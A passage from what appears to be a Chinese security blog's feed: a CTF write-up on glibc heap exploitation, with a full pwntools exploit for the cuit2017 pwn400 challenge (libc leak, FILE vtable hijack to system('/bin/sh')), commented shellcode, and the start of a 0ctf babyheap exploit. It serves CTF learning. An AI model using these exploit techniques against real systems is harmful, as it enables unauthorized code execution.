class=&quot;number&quot;&gt;128&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;68&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;35&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;245&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;144&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;102&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;20&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;194&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;207&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;66&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;154&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;98&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;219&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;65&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;131&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;185&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;27&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;162&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;214&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;63&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;238&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;248&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;38&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;129&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;170&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;180&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;181&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;96&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;165&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;78&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;121&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;55&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;214&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;193&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;94&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;107&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;45&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;83&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;56&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;41&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;58&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;169&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;120&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;58&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;178&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;58&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;217&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;93&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;74&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;18&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;217&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;219&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;89&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;164&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;228&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;133&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;175&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;164&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;37&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;176&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;94&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;232&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;82&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;47&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;212&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;107&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;111&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;97&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;153&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;119&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;85&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;147&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;256&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;130&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;248&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;235&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;221&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;178&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;50&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;49&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;39&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;215&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;200&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;188&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;105&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;101&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;172&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;133&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;28&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;88&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;83&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;32&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;45&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;215&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;204&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;141&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;226&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;118&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;233&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;156&lt;/span&gt;], [&lt;span class=&quot;number&quot;&gt;236&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;142&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;87&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;152&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;97&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;134&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;54&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;239&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;49&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;220&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;233&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;216&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;13&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;143&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;145&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;112&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;217&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;194&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;114&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;221&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;150&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;51&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;136&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;31&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;198&lt;/span&gt;]]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;r = [&lt;span class=&quot;number&quot;&gt;325799&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;309234&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;317320&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;327895&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;298316&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;301249&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;330242&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;289290&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;273446&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;337687&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;258725&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;267444&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;373557&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;322237&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;344478&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;362136&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;331815&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;315157&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;299242&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;305418&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;313569&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;269307&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;338319&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;306491&lt;/span&gt;, &lt;span class=&quot;number&quot;&gt;351259&lt;/span&gt;]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;o = np.array(o)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;r = np.array(r)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;x = np.linalg.solve(o,r)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; x&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;string = &lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; x:&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    string += chr(int(str(i)[&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;:&lt;span class=&quot;number&quot;&gt;-2&lt;/span&gt;]))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;print&lt;/span&gt; string&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://winter3un.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>【pwn】cuit2017 &amp; 0ctf2017 heap总结</title>
    <link href="https://winter3un.github.io/2017/06/04/heap-all/"/>
    <id>https://winter3un.github.io/2017/06/04/heap-all/</id>
    <published>2017-06-04T15:59:24.000Z</published>
    <updated>2017-06-04T16:15:22.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="涉及到的知识点"><a href="#涉及到的知识点" class="headerlink" title="涉及到的知识点"></a>涉及到的知识点</h3><p>1、fastbin attack</p><p>2、unsorted bin attack</p><p>3、malloc堆内存管理</p><a id="more"></a><h3 id="一些记录"><a href="#一些记录" class="headerlink" title="一些记录"></a>一些记录</h3><p>当我们用malloc申请一个0x20的空间的时候，glibc实际上给予了我们一个如下这样子的一个结构。</p><p>|head(0x8/0x10)|data(0x20)|</p><p><strong>注意：由于x84和x64的机器字长不一样，故其head头部大小也不一样，x86为0x8长度，x64为0x10长度。</strong></p><p>data区域是我们可以进行数据输入的区间，malloc返回的指针便是该区间的首地址，记作PTR</p><p>当我们free它的时候，它会判定是否与top chunk相邻，如果相邻，它将会与top chunk合并，如果不是的话，它会进一步判断自身大小是否满足fast bin的要求，fastbin的边界大小由 libc内的全局变量fast_max决定，不过x86下这个值为0x40，x64下位0x80，小于等于这个值的所有chunk，free后将有fast bin管理，如果该chunk可以重复free，我们则可以利用fast bin attack来实现<strong>有限制的地址写能力</strong>（<a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c</a> ）。而如果边界的大小大于fastbin的边界大小，该chunk则会加入到unsorted bin中去，此时我们可以修改bk来实现unsorted attack （ <a href="https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/unsorted_bin_attack.c</a> ）如果free 一个small/large chunk 的时候，可以修改本chunk、前一个或后一个，small/large chunk的head and data，则可以进行double free攻击。（ <a href="http://www.hackdig.com/08/hack-25191.htm" target="_blank" rel="external">http://www.hackdig.com/08/hack-25191.htm</a>  ）</p><h3 id="cuit2017-pwn400"><a href="#cuit2017-pwn400" class="headerlink" title="cuit2017 pwn400"></a>cuit2017 pwn400</h3><p>题目可以从我github上下载。</p><p>hint：ubuntu 16.04</p><p>本题利用方式为：fast bin attack 覆盖name变量实现信息泄露。  overlap chunk attack 实现 hijack fsp attack，最终修改vtable至onegadget 或者system 实现get shell。</p><p>注意点：x64下面 0x220为vtable偏移量。x86么。。还没测ORZ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-05-27 21:28:47</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./pwn400"</span></div><div class="line">remote_ip = <span class="string">"119.29.87.226"</span></div><div class="line">port =  <span class="number">50004</span></div><div class="line"><span class="comment"># rop = roputils.ROP(target)</span></div><div class="line">elf = ELF(target)</div><div class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,sec)</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(name)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(sec)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(sec)</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(sec)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">()</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit</span><span class="params">(data1,data2)</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"5"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"Y"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(data1)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(data2)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(size,title,advise)</span>:</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"6"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(size))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(title)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(advise)</div><div class="line"></div><div class="line"><span class="comment">#save(0x28,"a"*0x28+p64(0x21),"a"*0x18)</span></div><div class="line"></div><div class="line">add(<span class="string">"a"</span>*<span class="number">8</span>+p64(<span class="number">0x21</span>)+<span class="string">"\n"</span>,<span class="string">"1\n"</span>)</div><div class="line"></div><div class="line">dele()</div><div class="line">edit(str(<span class="number">0x6020c0</span>).rjust(<span class="number">7</span>,<span class="string">"0"</span>)+<span class="string">"\n"</span>)</div><div class="line">submit(<span class="string">"a"</span>*<span class="number">0x17</span>+<span class="string">"\x00\n"</span>,<span class="string">"a"</span>*<span class="number">0x8</span>+p64(elf.got[<span class="string">"alarm"</span>])+<span class="string">"\n"</span>)</div><div class="line"><span class="comment">##leak (- limit :(</span></div><div class="line">ru(<span class="string">"7.exit\n==============================\n"</span>)</div><div class="line">sl(<span class="string">"9"</span>)</div><div class="line"></div><div class="line">alarm_addr = u64(ru(<span class="string">",You"</span>)[<span class="number">5</span>:<span class="number">-4</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">libc_base = alarm_addr-libc.symbols[<span class="string">"alarm"</span>]</div><div class="line">one_gadget = libc_base + <span class="number">0xf5e40</span></div><div class="line">bin_sh = libc_base+next(libc.search(<span class="string">'/bin/sh'</span>))</div><div class="line">system_addr = libc_base+libc.symbols[<span class="string">"system"</span>]</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">##hijack fsp</span></div><div class="line">save(<span class="number">0x100</span>,<span class="string">"a"</span>*<span class="number">0x28</span>+p64(<span class="number">0x110</span>+<span class="number">0x231</span>+<span class="number">0x1010</span>),<span class="string">"aaa\n"</span>)</div><div class="line">ru(<span class="string">"te on "</span>)</div><div class="line">addr_1 = int(ru(<span class="string">")\n"</span>)[<span class="number">2</span>:<span class="number">-2</span>],<span class="number">16</span>)</div><div class="line"></div><div class="line"><span class="comment">#gdb.attach(p,"b*0x040111A\nc")</span></div><div class="line">payload  = <span class="number">0x1c</span>*p64(system_addr)</div><div class="line">payload +=<span class="string">"/\x80||/////bin/sh\x00"</span> <span class="comment">#start fsp</span></div><div class="line">payload +=<span class="number">0x16</span>*p64(addr_1)+p64(<span class="number">0</span>)+(<span class="number">0x47</span><span class="number">-0x19</span>)*p64(addr_1)+p64(addr_1)+<span class="string">"\n"</span></div><div class="line"></div><div class="line">save(<span class="number">0x380</span>,p64(system_addr)*<span class="number">4</span>+<span class="string">"\n"</span>,payload)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><p>似乎有个可以直接用来算偏移的C源码，妈妈再也不用担心我算不准偏移啦~<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line">  </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    FILE *fp;</div><div class="line">    fp=<span class="built_in">stderr</span>;</div><div class="line">    <span class="keyword">int</span> chain=&amp;(fp-&gt;_chain);</div><div class="line">    <span class="keyword">int</span> flags=&amp;(fp-&gt;_flags);</div><div class="line">    <span class="keyword">int</span> dis=chain-flags;</div><div class="line">  </div><div class="line">    <span class="built_in">printf</span>(<span class="string">"FILE struct size: 0x%x\n"</span>,<span class="keyword">sizeof</span>(FILE));</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;chain - fp: 0x%x %x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> mode=&amp;(fp-&gt;_mode);</div><div class="line">    dis=mode-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;mode - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> write_ptr=&amp;(fp-&gt;_IO_write_ptr);</div><div class="line">    dis=write_ptr-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;write_ptr - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> write_base=&amp;(fp-&gt;_IO_write_base);</div><div class="line">    dis=write_base-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;write_base - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> vtable_offset=&amp;(fp-&gt;_vtable_offset);</div><div class="line">    dis=vtable_offset-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;vtable_offset - fp: 0x%x\n"</span>,dis);</div><div class="line">  </div><div class="line">    <span class="keyword">int</span> read_ptr=&amp;(fp-&gt;_IO_read_ptr);</div><div class="line">    dis=read_ptr-flags;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"fp-&gt;read_ptr - fp: 0x%x\n"</span>,dis);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div></pre></td></tr></table></figure></p><h3 id="0ctf-baby-heap"><a href="#0ctf-baby-heap" class="headerlink" title="0ctf baby heap"></a>0ctf baby heap</h3><p>这题有两种利用方式，一种是全程使用fastbin attack ，还有一种是既利用fast bin 又利用 unsorted bin attack</p><p>exp1 如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div 